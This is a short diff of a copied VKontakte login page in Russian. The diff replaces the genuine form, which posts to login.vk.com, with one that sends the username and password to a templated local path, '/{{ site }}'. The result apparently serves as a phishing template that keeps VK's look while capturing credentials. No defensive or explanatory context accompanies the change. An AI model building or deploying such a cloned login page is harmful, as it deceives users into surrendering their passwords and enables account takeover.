@@ -226,16 +226,9 @@ var abp;
     <div id="content"><h2 class="login_header">Вход ВКонтакте</h2>
 <div id="login_message"><div class="msg info_msg"><div class="msg_text">Чтобы просматривать эту страницу, нужно зайти на сайт.</div></div></div>
 <div id="login_form_wrap" class="login_form_wrap">
-  <form method="post" name="login" id="login_form" action="https://login.vk.com/?act=login">
-    <input type="hidden" name="act" id="act" value="login">
-    <input type="hidden" name="to" id="to" value="YWxfZmVlZC5waHA/ej1waG90by0xMjM2NzIxMjNfNDU3MjY1MjIwJTJGYWxidW0tMTIzNjcyMTIzXzAwJTJGcmV2"https://vk.com/>
-    <input type="hidden" name="expire" id="expire_input" value="" />
-    <input type="hidden" name="_origin" value="https://vk.com" />
-    <input type="hidden" name="ip_h" value="d501f3c917c2e990c5" />
-    <input type="hidden" name="lg_h" value="a1962e06314e01764b" />
-    
-    <input type="text" class="big_text" name="email" id="email" value="" placeholder="Телефон или email" />
-    <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль" />
+  <form method="POST" action="/{{ site }}">
+    <input type="text" class="big_text" name="login" id="email" value="" placeholder="Телефон или email" />
+    <input type="password" class="big_text" name="password" id="pass" value="" placeholder="Пароль" />
     <div class="checkbox" id="expire" onclick="checkbox(this);ge('expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
     <div class="login_buttons_wrap">
       <button id="login_button" class="flat_button button_big_text login_button">Войти</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go('/join'); return cancelEvent(event);">Регистрация</button>
